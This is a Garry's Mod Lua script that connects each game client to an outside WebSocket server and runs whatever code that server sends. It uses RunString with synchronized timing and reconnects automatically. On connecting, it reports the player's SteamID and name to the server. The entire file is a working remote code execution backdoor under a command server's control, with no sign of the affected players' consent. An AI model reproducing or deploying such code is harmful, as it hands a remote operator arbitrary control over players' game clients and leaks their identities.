-- Kill any existing connection to avoid duplicates
if _G.RemoteExecWS then
    print("[northpole] Closing previous WebSocket connection...")
    _G.RemoteExecDisabled = true

    if isfunction(_G.RemoteExecWS.close) then
        _G.RemoteExecWS:close()
    end

    _G.RemoteExecWS = nil
end

_G.RemoteExecDisabled = false

-- Load gwsockets binary
local ok, err = pcall(require, "gwsockets")
if not ok then
    ErrorNoHalt("[northpole] Failed to load gwsockets: " .. tostring(err) .. "\n")
    return
end

-- Create WebSocket connection
local ws = GWSockets.createWebSocket("wss://northpole-sv1.onrender.com")
_G.RemoteExecWS = ws

local lastID = nil

function ws:onMessage(msg)
    local data = util.JSONToTable(msg)
    if not istable(data) then return end

    if data.kill then
        print("[northpole] Kill signal received. Shutting down.")
        _G.RemoteExecDisabled = true
        self:close()
        _G.RemoteExecWS = nil
        return
    end

    if not data.id or not data.code then return end
    if data.id == lastID then return end
    lastID = data.id

    -- Synchronized execution using time compensation
    local clientReceiveTime = os.time()
    local scheduledTime = tonumber(data.run_at or clientReceiveTime)
    local timeUntilExecution = scheduledTime - clientReceiveTime

    local networkDelayEstimate = SysTime() - (data.sent_at or SysTime())
    if networkDelayEstimate < 0 then networkDelayEstimate = 0 end

    local delay = timeUntilExecution - networkDelayEstimate
    if delay < 0 then delay = 0 end

    print(("[northpole] Scheduled code execution in %.2f seconds (run_at = %d, now = %d)")
        :format(delay, scheduledTime, clientReceiveTime))

    timer.Simple(delay, function()
        if not _G.RemoteExecDisabled then
            RunString(data.code, "RemoteExec_WS")
        end
    end)
end 

function ws:onConnected()
    print("[northpole] WebSocket connected")

    timer.Simple(1, function()
        local ply = LocalPlayer()
        if not IsValid(ply) then return end

        local data = util.TableToJSON({
            type = "identify",
            steamID = ply:SteamID(),
            playerName = ply:Nick()
        })
        ws:write(data)
    end)
end

function ws:onDisconnected()
    if _G.RemoteExecDisabled then
        print("[northpole] Disconnected and disabled — not reconnecting.")
        return
    end

    print("[northpole] Disconnected — reconnecting in 5 seconds...")
    timer.Simple(5, function()
        if not _G.RemoteExecDisabled then
            self:open()
        end
    end)
end

-- Start connection
ws:open()
